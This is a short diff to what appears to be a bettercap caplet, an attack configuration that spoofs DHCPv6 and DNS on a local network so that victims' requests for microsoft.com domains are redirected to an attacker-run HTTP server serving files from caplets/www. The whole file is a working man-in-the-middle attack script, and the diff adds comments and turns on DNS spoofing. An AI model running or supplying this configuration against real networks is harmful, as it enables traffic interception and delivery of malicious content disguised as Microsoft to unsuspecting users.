@@ -1,11 +1,20 @@
 # custom prompt for ipv6 ... this is cool, i know :)
 set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
 
-set dhcp6.spoof.domain microsoft.com
+# let's spoof microsoft.com domains
+set dns.spoof.domains microsoft.com
+# every request to *.microsoft.com will come to us, let's give em some contents
 set http.server.path caplets/www
 
+# check who's alive on the network
 net.recon on
+# serve files
 http.server on
+# redirect DNS request by spoofing DHCPv6 packets
 dhcp6.spoof on
+# send spoofed DNS replies ^_^
+dns.spoof on
+
+# clear the prompt
 events.clear
 clear
